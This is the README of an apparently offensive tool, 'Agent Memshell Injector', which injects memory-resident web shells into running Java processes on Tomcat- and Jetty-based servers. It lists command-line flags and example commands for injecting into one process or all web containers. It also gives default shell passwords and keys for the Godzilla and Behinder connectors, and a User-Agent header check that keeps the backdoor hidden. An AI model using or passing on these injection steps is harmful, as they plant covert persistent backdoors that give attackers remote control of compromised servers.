# Agent Memshell Injector

## Usage

```shell
Agent Memory-Shell Injector

Usage:
    -h, --help                  show the help doc
    -v, --version               print the version
    -l, --list                  List all jvm
    -i, --inject [pid]          inject target java process, use 'all' to auto-inject
    -d, --detach [pid]          uninstall agent memory-shell, use 'all' to auto-uninstall
    -t, --type [type]           Shell Type, available type [Godzilla(default), Behinder]
    -p, --password [password]   Shell password (Default c5e3ae619d4685160c2cb70c6d86f7c8)
    -k, --key [key]             Shell key, only work for Godzilla (Default fc80fa936982b2fb5c333dd2b9c5cd02)
    -u, --url                   URL Pattern (Default /*)
    -hk, --header-key [hk]      Memory shell header check, header name (Default User-Agent)
    -hv, --header-value [hv]    Memory shell header check, header value (Default "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.19.2171.71 Safari/537.36")

Example:
    1. Print the help doc:
        java -jar ami.jar -h
    2. Print the version:
        java -jar ami.jar -v
    3. List all jvm process:
        java -jar ami.jar -l
    4. Inject memory shell into target:
        java -jar ami.jar -i 100[or use all to auto-inject web container]
    5. Uninstall memory shell:
        java -jar ami.jar -d 100[or use all to auto-uninstall from web container]
    6. Specify memory shell url pattern:
        java -jar ami.jar -i 100 -u "/action/*"
    7. Specify memory shell header name and value:
        java -jar ami.jar -i 100 -hk "Referer" -hv "Memory Shell!"
```

> `URL Pattern` is not AVAILABLE now, always bind to `/*`, and memshell may have lower priority than regular service.

## Support

### Connector

- **Godzilla**
- **Behinder**

### Web App

- **Tomcat base**
- **Jetty base**